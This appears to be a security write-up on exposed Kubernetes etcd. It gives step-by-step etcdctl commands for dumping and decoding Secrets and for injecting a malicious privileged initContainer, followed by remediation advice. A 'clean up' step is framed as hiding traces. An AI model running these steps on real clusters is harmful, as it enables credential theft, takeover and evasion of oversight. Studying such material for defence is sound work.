
# Kubernetes etcd Direct Access and Enumeration Vulnerability

## 1. Overview

This document details the vulnerability of direct access and enumeration of the etcd database in a Kubernetes cluster.  An attacker with this level of access can effectively compromise the entire cluster.

### Attack Vector Description

The attack vector involves gaining unauthorized direct access to the etcd database. etcd is the Kubernetes cluster's primary data store, holding critical configuration information, secrets, and state data.  Direct access bypasses standard Kubernetes authorization and authentication mechanisms.

### Potential Impact and Consequences

*   **Complete Cluster Takeover:** An attacker can read or modify any Kubernetes object, including Secrets, ConfigMaps, Deployments, Services, and RBAC roles.
*   **Data Exfiltration:** Sensitive data stored in etcd, such as API keys, passwords, and other credentials, can be extracted.
*   **Denial of Service:** Manipulating etcd data can disrupt the cluster's operation, leading to a denial of service.
*   **Privilege Escalation:** Creating or modifying RBAC rules grants unauthorized access to resources.
*   **Persistence:** An attacker can create backdoors or persistent footholds within the cluster by modifying Deployments or creating new DaemonSets.

### Risk Level Assessment

**Critical**

### Technical Explanation

This vulnerability arises when:

*   **Insecure etcd Configuration:** etcd is exposed without proper authentication or authorization mechanisms. This might occur due to misconfiguration, weak passwords, or default settings.
*   **Firewall Misconfiguration:** Network policies or firewall rules improperly expose the etcd port (default: 2379 or 2380) to unauthorized access.
*   **Compromised Node:** If a node within the Kubernetes cluster is compromised, the attacker may leverage its internal network access to reach the etcd service.
*   **Missing or Inadequate TLS:** etcd is not configured to use TLS for client-server communication, allowing an attacker to intercept data.

### Prerequisites and Conditions Needed

*   Direct network access to the etcd service (typically over port 2379 or 2380).
*   Knowledge of the etcd endpoint (IP address or hostname and port).
*   Potentially, TLS certificates if etcd is configured with client authentication.
*   If using `etcdctl`, the command-line tool needs to be installed and configured correctly.

## 2. Validation and Exploitation Steps

### Phase 1: Validation - Determining etcd Access

**Step 1: Identify etcd Endpoint**

```bash
# Attempt to discover the etcd service endpoint through DNS or other means.
#  Kubernetes often creates a DNS entry for etcd.
nslookup etcd.kube-system.svc.cluster.local
```

*   **Explanation:** This command attempts to resolve the hostname `etcd.kube-system.svc.cluster.local` to find the IP address of the etcd service. It leverages Kubernetes' internal DNS.
*   **Why:**  Identifying the IP address is crucial for establishing a connection to etcd.
*   **Expected Output:** An IP address and port associated with the etcd service. If resolution fails, alternative methods like scanning or inspecting Kubernetes manifests must be used.
*   **Contribution:** This provides the initial target for the etcd access attempts.
*   **Alternative:** If DNS resolution fails, investigate Kubernetes Service definitions in the `kube-system` namespace using `kubectl get svc -n kube-system`.

**Step 2: Test Direct etcd Connection (Without TLS)**

```bash
# Attempt to connect to etcd without TLS using etcdctl.  This may fail if TLS is enabled.
etcdctl --endpoints=http://<etcd_ip>:<etcd_port> get / --prefix --keys-only
```

*   **Explanation:** This command attempts to connect to etcd using the `etcdctl` command-line tool over HTTP. The `--endpoints` flag specifies the etcd endpoint.  `get / --prefix --keys-only` retrieves all keys in the database.
*   **Why:** This tests if direct, unauthenticated access is permitted.
*   **Expected Output:** A list of keys if the connection is successful and authentication is not required. An error message if the connection fails or authentication is required. If TLS is required, you will see a connection error (e.g., `context deadline exceeded`).
*   **Contribution:**  Determines if etcd is accessible without authentication or TLS.
*   **Alternative:** Use `curl`: `curl http://<etcd_ip>:<etcd_port>/health` to check basic connectivity.

**Step 3: Test Direct etcd Connection (With TLS)**

```bash
# Attempt to connect to etcd with TLS using etcdctl, assuming self-signed certificates.
#  You may need to adjust the certificate paths.
etcdctl --endpoints=https://<etcd_ip>:<etcd_port> \
        --cacert=/path/to/ca.pem \
        --cert=/path/to/client.pem \
        --key=/path/to/client-key.pem \
        get / --prefix --keys-only
```

*   **Explanation:** This command attempts to connect to etcd over HTTPS, providing client certificates for authentication.
*   **Why:** This tests if access is possible with client certificates.  Obtaining these certificates depends on the specific cluster configuration.  A common scenario is that certificates are present on the Kubernetes master nodes.
*   **Expected Output:**  A list of keys if the connection is successful. An error message if the connection fails, the certificates are invalid, or the user is not authorized.
*   **Contribution:** Determines if etcd is accessible with TLS and client authentication.
*   **Alternative:** Use `curl`: `curl --cacert /path/to/ca.pem https://<etcd_ip>:<etcd_port>/health`.

**Step 4: Verify Access (If Connection Successful)**

If either Step 2 or 3 succeeds (i.e., returns a list of keys or a successful health check), you have confirmed direct access to etcd.  Proceed to Phase 2 (Exploitation).

### Phase 2: Exploitation - Enumerating and Exploiting Data

**Step 5: Enumerate Kubernetes Secrets**

```bash
# Retrieve Kubernetes Secrets stored in etcd.  This requires direct access to etcd.
etcdctl --endpoints=http://<etcd_ip>:<etcd_port> get /kubernetes.io/secrets --prefix --keys-only
```

*   **Explanation:** This command retrieves the keys associated with Kubernetes Secrets stored in etcd. The `/kubernetes.io/secrets` prefix is used to filter the results. Adjust the endpoint as needed based on TLS requirements.
*   **Why:**  Secrets often contain sensitive information, such as API keys, passwords, and other credentials.
*   **Expected Output:** A list of keys corresponding to Kubernetes Secrets.
*   **Contribution:**  Identifies the presence of Secrets within etcd.

**Step 6: Retrieve the Contents of a Secret (Example: kube-system/generic-token-abcde)**

```bash
# Replace with an actual secret key obtained from the previous step.
etcdctl --endpoints=http://<etcd_ip>:<etcd_port> get /kubernetes.io/secrets/kube-system/generic-token-abcde
```

*   **Explanation:** This command retrieves the value associated with a specific Kubernetes Secret key.  Again, adjust the endpoint based on TLS.
*   **Why:** This allows viewing the contents of the Secret, revealing potentially sensitive data.
*   **Expected Output:** A JSON or YAML representation of the Secret data, including the `data` field, which contains the base64-encoded secret values.
*   **Contribution:** Allows exfiltration of sensitive data stored within the secret.

**Step 7: Decode the Secret Data (Example - Base64)**

```bash
# Assuming the 'data' field contains a base64-encoded token:
echo "<base64_encoded_token>" | base64 --decode
```

*   **Explanation:** This command decodes the base64-encoded data retrieved from the Secret.
*   **Why:** The data within the `data` field of a Secret is typically base64 encoded. Decoding it reveals the actual value.
*   **Expected Output:** The decoded secret value (e.g., a Kubernetes service account token).
*   **Contribution:** Reveals the plaintext value of the secret.

**Step 8: Modify Kubernetes Objects (Example - Change a Deployment)**

```bash
# **DANGEROUS: Proceed with extreme caution. Modifying etcd directly can destabilize the cluster.**
# Retrieve the existing Deployment data (e.g., nginx deployment in default namespace)
etcdctl --endpoints=http://<etcd_ip>:<etcd_port> get /kubernetes.io/deployments/default/nginx > nginx_deployment.json

# **Offline manipulation:**
# Edit nginx_deployment.json to add a malicious initContainer or modify existing configuration.
#  For example: Add a privileged initContainer to mount the host's filesystem.

# Put the modified data back into etcd.
etcdctl --endpoints=http://<etcd_ip>:<etcd_port> put /kubernetes.io/deployments/default/nginx "$(cat nginx_deployment.json)"

# Verify the changes (through kubectl or by observing the deployment).
kubectl get deployment nginx -o yaml
```

*   **Explanation:** This series of commands demonstrates how to modify a Kubernetes Deployment by directly manipulating the data in etcd. **This is a highly dangerous operation that can severely destabilize the cluster.  It should only be performed in a controlled testing environment.** First, the current Deployment configuration is retrieved.  Then, the configuration is modified *offline* (outside of the `etcdctl` command).  Finally, the modified configuration is pushed back to etcd.
*   **Why:**  This demonstrates the ability to modify any Kubernetes object and gain control of the cluster. The example shows adding a privileged initContainer as a method of persistence and host access.
*   **Expected Output:**  After the `put` command, the Deployment in Kubernetes will reflect the changes made in the modified JSON file.
*   **Contribution:** Demonstrates the potential for complete cluster compromise.
*   **Alternative:** This can be used to modify RBAC roles, create backdoors, or change other critical configurations.

### Phase 3: Clean up (Important to prevent leaving traces)

```bash
# Delete added initContainers/unwanted RBAC roles/ other created resources
kubectl delete <resource_type> <resource_name> -n <namespace>
```

### Remediation Recommendations

*   **Enable TLS for etcd:**  Always configure etcd to use TLS for client-server communication to encrypt data in transit and prevent eavesdropping.  Implement mutual TLS for authentication.
*   **Implement RBAC for etcd:** Restrict access to etcd to only authorized users and services using role-based access control (RBAC).
*   **Secure Firewall Rules:**  Ensure that firewall rules only allow access to the etcd port (2379 or 2380) from authorized sources (e.g., Kubernetes master nodes).  Block access from untrusted networks.
*   **Network Policies:** Implement Kubernetes network policies to restrict network traffic between pods, limiting access to etcd from unauthorized pods.
*   **Regular Security Audits:**  Conduct regular security audits to identify and address potential misconfigurations or vulnerabilities.
*   **Principle of Least Privilege:**  Grant only the necessary permissions to users and services. Avoid granting broad access to etcd.
*   **Rotate Certificates Regularly:**  Rotate TLS certificates regularly to minimize the impact of compromised keys.
*   **Monitor etcd Access:**  Implement monitoring and alerting to detect unauthorized access attempts to etcd.  Monitor etcd logs for suspicious activity.
*   **Backup and Restore:**  Regularly back up the etcd database and test the restore process to ensure data recovery in case of a compromise or failure.
*   **Upgrade Kubernetes and etcd:** Keep Kubernetes and etcd up to date with the latest security patches and updates.
